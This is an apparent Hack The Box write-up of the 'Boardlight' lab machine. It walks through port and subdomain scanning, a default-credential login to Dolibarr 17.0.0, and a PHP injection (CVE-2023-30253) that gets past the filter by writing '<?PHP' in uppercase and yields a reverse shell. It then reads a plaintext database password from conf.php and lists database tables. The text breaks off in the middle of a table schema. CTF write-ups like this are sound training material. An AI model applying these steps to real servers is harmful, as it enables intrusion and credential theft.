---
layout: writeup
category: HTB
description: Boardlight is a linux machine that involves dolibarr exploitation and an enlightenment cve. First, a discovered subdomain uses dolibarr 17.0.0 as crm which is vulnerable to php injection that I used to receive a reverse shell as www-data. With that access, I had permissions to read php configuration files where mysql password is saved and it's reused for larissa system user. Finally, looking for files with SUID permissions, I saw enlightenment_sys binary which is vulnerable to [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) (code injection) and as the owner is root I can access as him.
points: 20
solves: 13574
tags: dolibarr CVE-2023-30253 subdomain-enumeration crm erp php-injection php-configuration mysql password-reuse suid enlightenment CVE-2022-37706
date: 2024-09-28
title: HTB Boardlight writeup
comments: false
---

{% raw %}

Boardlight is a linux machine that involves dolibarr exploitation and an enlightenment cve. First, a discovered subdomain uses dolibarr 17.0.0 as crm which is vulnerable to php injection that I used to receive a reverse shell as www-data. With that access, I had permissions to read php configuration files where mysql password is saved and it's reused for larissa system user. Finally, looking for files with SUID permissions, I saw enlightenment_sys binary which is vulnerable to [CVE-2022-37706](https://github.com/MaherAzzouzi/CVE-2022-37706-LPE-exploit) (code injection) and as the owner is root I can access as him.

# Ports recognaissance

```bash
❯ sudo nmap -sS --min-rate 5000 -p- --open -v -n -Pn -sVC 10.10.11.11 -oA boardlight
<..SNIP..>
❯ cat boardlight.nmap
# Nmap 7.94SVN scan initiated Fri Sep 27 18:18:39 2024 as: nmap -sS --min-rate 5000 -p- --open -v -n -Pn -sVC -oA boardlight 10.10.11.11
Nmap scan report for 10.10.11.11
Host is up (0.36s latency).
Not shown: 59342 closed tcp ports (reset), 6191 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 06:2d:3b:85:10:59:ff:73:66:27:7f:0e:ae:03:ea:f4 (RSA)
|   256 59:03:dc:52:87:3a:35:99:34:44:74:33:78:31:35:fb (ECDSA)
|_  256 ab:13:38:e4:3e:e0:24:b4:69:38:a9:63:82:38:dd:f4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Sep 27 18:19:15 2024 -- 1 IP address (1 host up) scanned in 35.87 seconds
```

> [My used arguments for nmap](http://gabrielgonzalez211.github.io/blog/nmap-arguments.html)

There are two ports open, 22 and 80.

- 80 -> HTTP, Apache 2.4.41.
- 22 -> OpenSSH 8.2p1 Ubuntu, useful when I get credentials or keys.

I don't have creds for ssh so I will jump into port 80.

# Web enumeration (Port 80)

Taking a look with curl, I can see that it doesn't have a title and nothing more interesting:

```bash
❯ curl -i -s http://10.10.11.11 | less
HTTP/1.1 200 OK
Date: Fri, 27 Sep 2024 16:25:33 GMT
Server: Apache/2.4.41 (Ubuntu)
Vary: Accept-Encoding
Transfer-Encoding: chunked
Content-Type: text/html; charset=UTF-8

<!DOCTYPE html>
<html>

<head>
  <!-- Basic -->
  <meta charset="utf-8" />
  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
  <!-- Mobile Metas -->
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no" />
  <!-- Site Metas -->
  <meta name="keywords" content="" />
  <meta name="description" content="" />
  <meta name="author" content="" />


  <!-- slider stylesheet -->
  <!-- slider stylesheet -->
  <link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/OwlCarousel2/2.3.4/assets/owl.carousel.min.css" />

  <!-- bootstrap core css -->
  <link rel="stylesheet" type="text/css" href="css/bootstrap.css" />

  <!-- fonts style -->
  <link href="https://fonts.googleapis.com/css?family=Open+Sans:400,700|Poppins:400,700&display=swap" rel="stylesheet">
  <!-- Custom styles for this template -->
  <link href="css/style.css" rel="stylesheet" />
  <!-- responsive style -->
  <link href="css/responsive.css" rel="stylesheet" />
</head>
<..SNIP..>
```

Also, whatweb doesn't shows anything interesting appart from an email info@board.htb:

```bash
❯ whatweb http://10.10.11.11
http://10.10.11.11 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[info@board.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.11.11], JQuery[3.4.1], Script[text/javascript], X-UA-Compatible[IE=edge]
```

Taking a look in the browser shows that it's a landing page:

![](/assets/images/Boardlight/Pasted%20image%2020240927183029.png)

At the footer also appears the domain `board.htb`:

![](/assets/images/Boardlight/Pasted%20image%2020240927183115.png)

So in case that this domain is used in apache to retrieve some different webpage, I will add it to the end of my /etc/hosts file for my system to know to which IP should solve that domain:

```plaintext
❯ sudo vi /etc/hosts
10.10.11.11 board.htb
```

But that's not the case because the md5 hash value of the whole page of both IP and domain is same (which means that the content is the same):

```bash
❯ curl -s 10.10.11.11 | md5sum
6d780449d37c147a5c38a0eeff9d4f2d  -
❯ curl -s board.htb | md5sum
6d780449d37c147a5c38a0eeff9d4f2d  -
```

However, I still can enumerate subdomains with the `Host` header to see if someone is valid:

```bash
❯ ffuf -u http://board.htb -H "Host: FUZZ.board.htb" -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -fs 15949

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://board.htb
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt
 :: Header           : Host: FUZZ.board.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 15949
________________________________________________

crm                     [Status: 200, Size: 6360, Words: 397, Lines: 150, Duration: 375ms]
:: Progress: [114441/114441] :: Job [1/1] :: 108 req/sec :: Duration: [0:18:23] :: Errors: 0 ::
```

I can see the crm.board.htb subdomain, which I will add to the /etc/hosts. Inspecting it with curl, I can see it consists on a dolibarr 17.0.0 instance:

```bash
❯ curl -s crm.board.htb | less
```

![](/assets/images/Boardlight/Pasted%20image%2020240928095124.png)

And in the browser looks like this:

![](/assets/images/Boardlight/Pasted%20image%2020240928095305.png)

Searching for what dolibarr is, I can see it's a web-based ERP and CRM software:

![](/assets/images/Boardlight/Pasted%20image%2020240928095512.png)

ERP is a software which allows to manage financial staff in a business:

![](/assets/images/Boardlight/Pasted%20image%2020240928095733.png)

And a CRM is a software that lets store customer information, identify sales opportunities, etc: 

![](/assets/images/Boardlight/Pasted%20image%2020240928095749.png)

# Access as www-data

Looking for vulnerabilities of dolibarr 17.0.0, I can see [this article](https://www.swascan.com/security-advisory-dolibarr-17-0-0/) that talks about exploiting CVE-2023-30253, a PHP code injection vulnerability:

![](/assets/images/Boardlight/Pasted%20image%2020240928100100.png)

But it requires authentication:

![](/assets/images/Boardlight/Pasted%20image%2020240928100327.png)

However, trying admin:admin does work:

![](/assets/images/Boardlight/Pasted%20image%2020240928100506.png)

I will add a website like the PoC says:

![](/assets/images/Boardlight/Pasted%20image%2020240928100617.png)

And add a page in that created website:

![](/assets/images/Boardlight/Pasted%20image%2020240928101155.png)

Then, I will click on "Edit HTML Source" and try to add php code that executes the whoami command:

![](/assets/images/Boardlight/Pasted%20image%2020240928100909.png)

But it says that the system function is disabled (as shown in the PoC):

![](/assets/images/Boardlight/Pasted%20image%2020240928101304.png)

The PoC says it can be bypassed by putting some letter of `<?php` in uppercase because the filters of dolibarr code doesn't check the case:

![](/assets/images/Boardlight/Pasted%20image%2020240928101511.png)

So I will put `<?PHP` instead of `<?php` and see what happens:

![](/assets/images/Boardlight/Pasted%20image%2020240928101650.png)

Now clicking on "Show dynamic content", I can see the results of `whoami` command:

![](/assets/images/Boardlight/Pasted%20image%2020240928101733.png)

But instead of executing whoami, I want to get access to the system, so I will start a nc listener and put a command to receive a reverse shell there:

![](/assets/images/Boardlight/Pasted%20image%2020240928101944.png)

And I receive a shell as www-data in the host machine:

![](/assets/images/Boardlight/Pasted%20image%2020240928102011.png)

Now, I will do a tty treatment to have a more stabilized shell, do ctrl+c, ctrl+l, etc:

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ script /dev/null -c bash
<.board.htb/htdocs/website$ script /dev/null -c bash     
Script started, file is /dev/null
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ ^Z
[1]  + 30548 suspended  nc -lvnp 443
❯ stty raw -echo; fg
[1]  + 30548 continued  nc -lvnp 443
                                    reset xterm
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ export TERM=xterm
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ export SHELL=bash
www-data@boardlight:~/html/crm.board.htb/htdocs/website$ stty rows 50 cols 184
```

* `script /dev/null -c bash`: Spawns a tty.
* `ctrl+z`: puts the shell in background for later doing a treatment.
* `stty raw -echo;fg`: gives the shell back again.
* `reset xterm`: resets the terminal to give the bash console.
* `export TERM=xterm`: lets do ctrl+l to clean the terminal.
* `export SHELL=bash`: specifies the system that it's using a bash console.
* `stty rows <YOUR ROWS> cols <YOUR COLUMNS>`: sets the size of the current full terminal window. It is possible to view the right size for your window running `stty size` in a entire new window on your terminal.

# Access as larissa

Looking for php configuration files, I can see that the user.class.php uses some sql queries to execute:

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs$ cat user/class/user.class.php | grep -i SELECT
		$sql = "SELECT u.rowid, u.lastname, u.firstname, u.employee, u.gender, u.civility as civility_code, u.birth, u.email, u.personal_email, u.job,";
			$sql = "SELECT param, value FROM ".$this->db->prefix()."user_param";
			$sql = "SELECT module, perms, subperms";
			$sql = "SELECT id";
			$sql = "SELECT module, perms, subperms";
			$sql = "SELECT id";
		$sql = "SELECT DISTINCT r.module, r.perms, r.subperms";
		$sql = "SELECT DISTINCT r.module, r.perms, r.subperms";
			$sqltochecklogin = "SELECT COUNT(*) as nb FROM ".$this->db->prefix()."user WHERE entity IN (".$this->db->sanitize((int) $this->entity).", 0) AND login = '".$this->db->escape($this->login)."'";
			$sqltochecklogin = "SELECT COUNT(*) as nb FROM ".$this->db->prefix()."user WHERE entity IN (".$this->db->sanitize((int) $this->entity).", 0) AND email = '".$this->db->escape($this->email)."'";
		$sql = "SELECT id FROM ".$this->db->prefix()."rights_def";
			$sqltochecklogin = "SELECT COUNT(*) as nb FROM ".$this->db->prefix()."user WHERE entity IN (".$this->db->sanitize((int) $this->entity).", 0) AND login = '".$this->db->escape($this->login)."'";
			$sqltochecklogin = "SELECT COUNT(*) as nb FROM ".$this->db->prefix()."user WHERE entity IN (".$this->db->sanitize((int) $this->entity).", 0) AND email = '".$this->db->escape($this->email)."'";
		$sql = "SELECT url, login, pass, poste ";
					$info[$conf->global->LDAP_FIELD_GROUPID] = $groupforuser->id; //Select first group in list
		$sql = "SELECT u.rowid, u.login as ref, u.datec,";
		$sql = "SELECT count(mc.email) as nb";
		$sql = "SELECT count(rowid) as nb";
		$sql = "SELECT rowid FROM ".$this->db->prefix()."user";
		$sql = "SELECT fk_user as id_parent, rowid as id_son";
		$sql = "SELECT DISTINCT u.rowid, u.firstname, u.lastname, u.fk_user, u.fk_soc, u.login, u.email, u.gender, u.admin, u.statut, u.photo, u.entity"; // Distinct reduce pb with old tables with duplicates
		$sql = "SELECT COUNT(DISTINCT u.rowid) as nb";
		$sql = "SELECT rowid, email, user_mobile, civility, lastname, firstname";
		$sql = "SELECT t.rowid";
		$sql = 'SELECT rowid';
```

But some credentials are needed to use sql so where are saved? In that script, I can see that to execute a query is using the function query of the class db of the current object:

```php
	public function findUserIdByEmail($email)
	{
		if (isset($this->findUserIdByEmailCache[$email])) {
			return $this->findUserIdByEmailCache[$email];
		}

		$this->findUserIdByEmailCache[$email] = -1;

		global $conf;

		$sql = 'SELECT rowid';
		$sql .= ' FROM '.$this->db->prefix().'user';
		if (!empty($conf->global->AGENDA_DISABLE_EXACT_USER_EMAIL_COMPARE_FOR_EXTERNAL_CALENDAR)) {
			$sql .= " WHERE email LIKE '%".$this->db->escape($email)."%'";
		} else {
			$sql .= " WHERE email = '".$this->db->escape($email)."'";
		}
		$sql .= ' LIMIT 1';

		$resql = $this->db->query($sql);
		if (!$resql) {
			return -1;
		}

		$obj = $this->db->fetch_object($resql);
		if (!$obj) {
			return -1;
		}

		$this->findUserIdByEmailCache[$email] = (int) $obj->rowid;

		return $this->findUserIdByEmailCache[$email];
	}
```

Searching recursively for that variable in php script, I can see it uses the '$conf' variable for the user, password, etc:

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs$ grep '$db' -r *.php
```

![](/assets/images/Boardlight/Pasted%20image%2020240928103502.png)

The `$conf` variable takes the parameters from variables like `$dolibarr_main_db_user` and `$dolibarr_main_db_pass` that are taked from some php file:

```php
require_once DOL_DOCUMENT_ROOT.'/core/class/conf.class.php';

$conf = new Conf();

// Set properties specific to database
$conf->db->host = empty($dolibarr_main_db_host) ? '' : $dolibarr_main_db_host;
$conf->db->port = empty($dolibarr_main_db_port) ? '' : $dolibarr_main_db_port;
$conf->db->name = empty($dolibarr_main_db_name) ? '' : $dolibarr_main_db_name;
$conf->db->user = empty($dolibarr_main_db_user) ? '' : $dolibarr_main_db_user;
$conf->db->pass = empty($dolibarr_main_db_pass) ? '' : $dolibarr_main_db_pass;
$conf->db->type = $dolibarr_main_db_type;
$conf->db->prefix = $dolibarr_main_db_prefix;
$conf->db->character_set = $dolibarr_main_db_character_set;
$conf->db->dolibarr_main_db_collation = $dolibarr_main_db_collation;
$conf->db->dolibarr_main_db_encryption = $dolibarr_main_db_encryption;
$conf->db->dolibarr_main_db_cryptkey = $dolibarr_main_db_cryptkey;
if (defined('TEST_DB_FORCE_TYPE')) {
	$conf->db->type = constant('TEST_DB_FORCE_TYPE'); // Force db type (for test purpose, by PHP unit for example)
}
```

And I can see they are stored in the conf/conf.php file:

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs$ cat conf/conf.php | grep 'dolibarr_main_db'
$dolibarr_main_db_host='localhost';
$dolibarr_main_db_port='3306';
$dolibarr_main_db_name='dolibarr';
$dolibarr_main_db_prefix='llx_';
$dolibarr_main_db_user='dolibarrowner';
$dolibarr_main_db_pass='serverfun2$2023!!';
$dolibarr_main_db_type='mysqli';
$dolibarr_main_db_character_set='utf8';
$dolibarr_main_db_collation='utf8_unicode_ci';
```

However, the only user stored in the dolibarr database that is interesting is dolibarr (because I already know that the password of admin is admin):

```bash
www-data@boardlight:~/html/crm.board.htb/htdocs$ mysql -udolibarrowner -p'serverfun2$2023!!'
mysql: [Warning] Using a password on the command line interface can be insecure.
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 197
Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)

Copyright (c) 2000, 2024, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| dolibarr           |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)

mysql> use dolibarr;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+-------------------------------------------------------------+
| Tables_in_dolibarr                                          |
+-------------------------------------------------------------+
| llx_accounting_account                                      |
| llx_accounting_bookkeeping                                  |
| llx_accounting_bookkeeping_tmp                              |
| llx_accounting_fiscalyear                                   |
| llx_accounting_groups_account                               |
| llx_accounting_journal                                      |
| llx_accounting_system                                       |
| llx_actioncomm                                              |
| llx_actioncomm_extrafields                                  |
| llx_actioncomm_reminder                                     |
| llx_actioncomm_resources                                    |
| llx_adherent                                                |
| llx_adherent_extrafields                                    |
| llx_adherent_type                                           |
| llx_adherent_type_extrafields                               |
| llx_adherent_type_lang                                      |
| llx_bank                                                    |
| llx_bank_account                                            |
| llx_bank_account_extrafields                                |
| llx_bank_categ                                              |
| llx_bank_class                                              |
| llx_bank_extrafields                                        |
| llx_bank_url                                                |
| llx_blockedlog                                              |
| llx_blockedlog_authority                                    |
| llx_bom_bom                                                 |
| llx_bom_bom_extrafields                                     |
| llx_bom_bomline                                             |
| llx_bom_bomline_extrafields                                 |
| llx_bookmark                                                |
| llx_bordereau_cheque                                        |
| llx_boxes                                                   |
| llx_boxes_def                                               |
| llx_budget                                                  |
| llx_budget_lines                                            |
| llx_c_accounting_category                                   |
| llx_c_action_trigger                                        |
| llx_c_actioncomm                                            |
| llx_c_availability                                          |
| llx_c_barcode_type                                          |
| llx_c_chargesociales                                        |
| llx_c_civility                                              |
| llx_c_country                                               |
| llx_c_currencies                                            |
| llx_c_departements                                          |
| llx_c_ecotaxe                                               |
| llx_c_effectif                                              |
| llx_c_email_senderprofile                                   |
| llx_c_email_templates                                       |
| llx_c_exp_tax_cat                                           |
| llx_c_exp_tax_range                                         |
| llx_c_field_list                                            |
| llx_c_format_cards                                          |
| llx_c_forme_juridique                                       |
| llx_c_holiday_types                                         |
| llx_c_hrm_department                                        |
| llx_c_hrm_function                                          |
| llx_c_hrm_public_holiday                                    |
| llx_c_incoterms                                             |
| llx_c_input_method                                          |
| llx_c_input_reason                                          |
| llx_c_lead_status                                           |
| llx_c_paiement                                              |
| llx_c_paper_format                                          |
| llx_c_payment_term                                          |
| llx_c_price_expression                                      |
| llx_c_price_global_variable                                 |
| llx_c_price_global_variable_updater                         |
| llx_c_product_nature                                        |
| llx_c_productbatch_qcstatus                                 |
| llx_c_propalst                                              |
| llx_c_prospectcontactlevel                                  |
| llx_c_prospectlevel                                         |
| llx_c_recruitment_origin                                    |
| llx_c_regions                                               |
| llx_c_revenuestamp                                          |
| llx_c_shipment_mode                                         |
| llx_c_shipment_package_type                                 |
| llx_c_socialnetworks                                        |
| llx_c_stcomm                                                |
| llx_c_stcommcontact                                         |
| llx_c_ticket_category                                       |
| llx_c_ticket_resolution                                     |
| llx_c_ticket_severity                                       |
| llx_c_ticket_type                                           |
| llx_c_transport_mode                                        |
| llx_c_tva                                                   |
| llx_c_type_contact                                          |
| llx_c_type_container                                        |
| llx_c_type_fees                                             |
| llx_c_type_resource                                         |
| llx_c_typent                                                |
| llx_c_units                                                 |
| llx_c_ziptown                                               |
| llx_categorie                                               |
| llx_categorie_account                                       |
| llx_categorie_actioncomm                                    |
| llx_categorie_contact                                       |
| llx_categorie_fournisseur                                   |
| llx_categorie_lang                                          |
| llx_categorie_member                                        |
| llx_categorie_product                                       |
| llx_categorie_project                                       |
| llx_categorie_societe                                       |
| llx_categorie_user                                          |
| llx_categorie_warehouse                                     |
| llx_categorie_website_page                                  |
| llx_categories_extrafields                                  |
| llx_chargesociales                                          |
| llx_commande                                                |
| llx_commande_extrafields                                    |
| llx_commande_fournisseur                                    |
| llx_commande_fournisseur_dispatch                           |
| llx_commande_fournisseur_dispatch_extrafields               |
| llx_commande_fournisseur_extrafields                        |
| llx_commande_fournisseur_log                                |
| llx_commande_fournisseurdet                                 |
| llx_commande_fournisseurdet_extrafields                     |
| llx_commandedet                                             |
| llx_commandedet_extrafields                                 |
| llx_comment                                                 |
| llx_const                                                   |
| llx_contrat                                                 |
| llx_contrat_extrafields                                     |
| llx_contratdet                                              |
| llx_contratdet_extrafields                                  |
| llx_contratdet_log                                          |
| llx_cronjob                                                 |
| llx_default_values                                          |
| llx_delivery                                                |
| llx_delivery_extrafields                                    |
| llx_deliverydet                                             |
| llx_deliverydet_extrafields                                 |
| llx_document_model                                          |
| llx_ecm_directories                                         |
| llx_ecm_directories_extrafields                             |
| llx_ecm_files                                               |
| llx_ecm_files_extrafields                                   |
| llx_element_categorie                                       |
| llx_element_contact                                         |
| llx_element_element                                         |
| llx_element_resources                                       |
| llx_emailcollector_emailcollector                           |
| llx_emailcollector_emailcollectoraction                     |
| llx_emailcollector_emailcollectorfilter                     |
| llx_entrepot                                                |
| llx_entrepot_extrafields                                    |
| llx_establishment                                           |
| llx_event_element                                           |
| llx_eventorganization_conferenceorboothattendee             |
| llx_eventorganization_conferenceorboothattendee_extrafields |
| llx_events                                                  |
| llx_expedition                                              |
| llx_expedition_extrafields                                  |
| llx_expedition_package                                      |
| llx_expeditiondet                                           |
| llx_expeditiondet_batch                                     |
| llx_expeditiondet_extrafields                               |
| llx_expensereport                                           |
| llx_expensereport_det                                       |
| llx_expensereport_extrafields                               |
| llx_expensereport_ik                                        |
| llx_expensereport_rules                                     |
| llx_export_compta                                           |
| llx_export_model                                            |
| llx_extrafields                                             |
| llx_facture                                                 |
| llx_facture_extrafields                                     |
| llx_facture_fourn                                           |
| llx_facture_fourn_det                                       |
| llx_facture_fourn_det_extrafields                           |
| llx_facture_fourn_det_rec                                   |
| llx_facture_fourn_det_rec_extrafields                       |
| llx_facture_fourn_extrafields                               |
| llx_facture_fourn_rec                                       |
| llx_facture_fourn_rec_extrafields                           |
| llx_facture_rec                                             |
| llx_facture_rec_extrafields                                 |
| llx_facturedet                                              |
| llx_facturedet_extrafields                                  |
| llx_facturedet_rec                                          |
| llx_facturedet_rec_extrafields                              |
| llx_fichinter                                               |
| llx_fichinter_extrafields                                   |
| llx_fichinter_rec                                           |
| llx_fichinterdet                                            |
| llx_fichinterdet_extrafields                                |
| llx_fichinterdet_rec                                        |
| llx_holiday                                                 |
| llx_holiday_config                                          |
| llx_holiday_extrafields                                     |
| llx_holiday_logs                                            |
| llx_holiday_users                                           |
| llx_import_model                                            |
| llx_inventory_extrafields                                   |
| llx_links                                                   |
| llx_localtax                                                |
| llx_mailing_unsubscribe                                     |
| llx_menu                                                    |
| llx_mrp_mo                                                  |
| llx_mrp_mo_extrafields                                      |
| llx_mrp_production                                          |
| llx_multicurrency                                           |
| llx_multicurrency_rate                                      |
| llx_notify                                                  |
| llx_notify_def                                              |
| llx_notify_def_object                                       |
| llx_oauth_state                                             |
| llx_oauth_token                                             |
| llx_object_lang                                             |
| llx_onlinesignature                                         |
| llx_overwrite_trans                                         |
| llx_paiement                                                |
| llx_paiement_facture                                        |
| llx_paiementcharge                                          |
| llx_paiementfourn                                           |
| llx_paiementfourn_facturefourn                              |
| llx_payment_donation                                        |
| llx_payment_expensereport                                   |
| llx_payment_loan                                            |
| llx_payment_salary                                          |
| llx_payment_various                                         |
| llx_payment_vat                                             |
| llx_pos_cash_fence                                          |
| llx_prelevement                                             |
| llx_prelevement_bons                                        |
| llx_prelevement_demande                                     |
| llx_prelevement_lignes                                      |
| llx_prelevement_rejet                                       |
| llx_printing                                                |
| llx_product                                                 |
| llx_product_association                                     |
| llx_product_attribute                                       |
| llx_product_attribute_combination                           |
| llx_product_attribute_combination2val                       |
| llx_product_attribute_combination_price_level               |
| llx_product_attribute_value                                 |
| llx_product_batch                                           |
| llx_product_customer_price                                  |
| llx_product_customer_price_log                              |
| llx_product_extrafields                                     |
| llx_product_fournisseur_price                               |
| llx_product_fournisseur_price_extrafields                   |
| llx_product_fournisseur_price_log                           |
| llx_product_lang                                            |
| llx_product_lot                                             |
| llx_product_lot_extrafields                                 |
| llx_product_price                                           |
| llx_product_price_by_qty                                    |
| llx_product_pricerules                                      |
| llx_product_stock                                           |
| llx_product_warehouse_properties                            |
| llx_projet                                                  |
| llx_projet_extrafields                                      |
| llx_projet_task                                             |
| llx_projet_task_extrafields                                 |
| llx_projet_task_time                                        |
| llx_propal                                                  |
| llx_propal_extrafields                                      |
| llx_propal_merge_pdf_product                                |
| llx_propaldet                                               |
| llx_propaldet_extrafields                                   |
| llx_reception                                               |
| llx_reception_extrafields                                   |
| llx_resource                                                |
| llx_resource_extrafields                                    |
| llx_rights_def                                              |
| llx_salary                                                  |
| llx_salary_extrafields                                      |
| llx_session                                                 |
| llx_societe                                                 |
| llx_societe_account                                         |
| llx_societe_address                                         |
| llx_societe_commerciaux                                     |
| llx_societe_contacts                                        |
| llx_societe_extrafields                                     |
| llx_societe_prices                                          |
| llx_societe_remise                                          |
| llx_societe_remise_except                                   |
| llx_societe_remise_supplier                                 |
| llx_societe_rib                                             |
| llx_socpeople                                               |
| llx_socpeople_extrafields                                   |
| llx_stock_mouvement                                         |
| llx_stock_mouvement_extrafields                             |
| llx_subscription                                            |
| llx_supplier_proposal                                       |
| llx_supplier_proposal_extrafields                           |
| llx_supplier_proposaldet                                    |
| llx_supplier_proposaldet_extrafields                        |
| llx_takepos_floor_tables                                    |
| llx_tva                                                     |
| llx_user                                                    |
| llx_user_alert                                              |
| llx_user_clicktodial                                        |
| llx_user_employment                                         |
| llx_user_extrafields                                        |
| llx_user_param                                              |
| llx_user_rib                                                |
| llx_user_rights                                             |
| llx_usergroup                                               |
| llx_usergroup_extrafields                                   |
| llx_usergroup_rights                                        |
| llx_usergroup_user                                          |
| llx_website                                                 |
| llx_website_extrafields                                     |
| llx_website_page                                            |
+-------------------------------------------------------------+
307 rows in set (0.00 sec)
```

```bash

mysql> describe llx_user;
+------------------------------+--------------+------+-----+-------------------+-----------------------------------------------+
| Field                        | Type         | Null | Key | Default           | Extra                                         |
+------------------------------+--------------+------+-----+-------------------+-----------------------------------------------+
| rowid                        | int          | NO   | PRI | NULL              | auto_increment                                |
| entity                       | int          | NO   |     | 1                 |                                               |
| ref_employee                 | varchar(50)  | YES  |     | NULL              |                                               |
| ref_ext                      | varchar(50)  | YES  |     | NULL              |                                               |
| admin                        | smallint     | YES  |     | 0                 |                                               |
| employee                     | tinyint      | YES  |     | 1                 |                                               |
| fk_establishment             | int          | YES  |     | 0                 |                                               |
| datec                        | datetime     | YES  |     | NULL              |                                               |
| tms                          | timestamp    | YES  |     | CURRENT_TIMESTAMP | DEFAULT_GENERATED on update CURRENT_TIMESTAMP |
| fk_user_creat                | int          | YES  |     | NULL              |                                               |
| fk_user_modif                | int          | YES  |     | NULL              |                                               |
| login                        | varchar(50)  | NO   | MUL | NULL              |                                               |
| pass_encoding                | varchar(24)  | YES  |     | NULL              |                                               |
| pass                         | varchar(128) | YES  |     | NULL              |                                               |
| pass_crypted                 | varchar(128) | YES  |     | NULL              |                                               |
| pass_temp                    | varchar(128) | YES  |     | NULL              |                                               |
| api_key                      | varchar(128) | YES  | UNI | NULL              |                                               |
| gender                       | varchar(10)  | YES  |     | NULL              |                                               |
| civility                     | varchar(6)   | YES  |     | NULL              |                                               |
| lastname                     | varchar(50)  | YES  |     | NULL              |                                               |
| firstname                    | varchar(50)  | YES  |     | NULL              |                                               |
| address                      | varchar(255) | YES  |     | NULL              |                                               |
| zip                          | varchar(25)  | YES  |     | NULL              |                                               |
| town                         | varchar(50)  | YES  |     | NULL              |                                               |
| fk_state                     | int          | YES  |     | 0                 |                                               |
| fk_country                   | int          | YES  |     | 0                 |                                               |
| birth                        | date         | YES  |     | NULL              |                                               |
| birth_place                  | varchar(64)  | YES  |     | NULL              |                                               |
| job                          | varchar(128) | YES  |     | NULL              |                                               |
| office_phone                 | varchar(20)  | YES  |     | NULL              |                                               |
| office_fax                   | varchar(20)  | YES  |     | NULL              |                                               |
| user_mobile                  | varchar(20)  | YES  |     | NULL              |                                               |
| personal_mobile              | varchar(20)  | YES  |     | NULL              |                                               |
| email                        | varchar(255) | YES  |     | NULL              |                                               |
| personal_email               | varchar(255) | YES  |     | NULL              |                                               |
| signature                    | text         | YES  |     | NULL              |                                               |
| socialnetworks               | text         | YES  |     | NULL              |                                               |
| fk_soc                       | int          | YES  | MUL | NULL              |                                               |
| fk_socpeople                 | int          | YES  | UNI | NULL              |                                               |
| fk_member                    | int          | YES  | UNI | NULL              |                                               |
| fk_user                      | int          | YES  |     | NULL              |                                               |
| fk_user_expense_validator    | int          | YES  |     | NULL              |                                               |
| fk_user_holiday_validator    | int          | YES  |     | NULL              |                                               |
| idpers1                      | varchar(128) | YES  |     | NULL              |                                               |
| idpers2                      | varchar(128) | YES  |     | NULL              |                                               |
| idpers3                      | varchar(128) | YES  |     | NULL              |                                               |
| note_public                  | text         | YES  |     | NULL              |                                               |
| note_private                 | text         | YES  |     | NULL              |                                               |
| model_pdf                    | varchar(255) | YES  |     | NULL              |                                               |
| datelastlogin                | datetime     | YES  |     | NULL              |                                               |
| datepreviouslogin            | datetime     | YES  |     | NULL              |                                               |
| datelastpassvalidation       | datetime     | YES  |     | NULL              |                                               |
| datestartvalidity            | datetime     | YES  |     | NULL              |                                               |
| dateendvalidity              | datetime     | YES  |     | NULL              |                                               |
| iplastlogin                  | varchar(250) | YES  |     | NULL              |                                               |
| ippreviouslogin              | varchar(250) | YES  |     | NULL              |                                               |
| egroupware_id                | int          | YES  |     | NULL              |                                               |
| ldap_sid                     | varchar(255) | YES  |     | NULL              |                                               |
| openid                       | varchar(255) | YES  |     | NULL              |                                               |
| statut                       | tinyint      | YES  |     | 1                 |                                               |
| photo                        | varchar(255) | YES  |     | NULL              |                                               |
| lang                         | varchar(6)   | YES  |     | NULL              |                                               |
| color                        | varchar(6)   | YES  |     | NULL              |                                               |
| barcode                      | varchar(255) | YES  |     | NULL              |                                               |
| fk_barcode_type              | int          | YES  |     | 0                 |                                               |
| accountancy_code             | varchar(32)  | YES  |     | NULL              |                                               |
| nb_holiday                   | int          | YES  |     | 0                 |                                               |
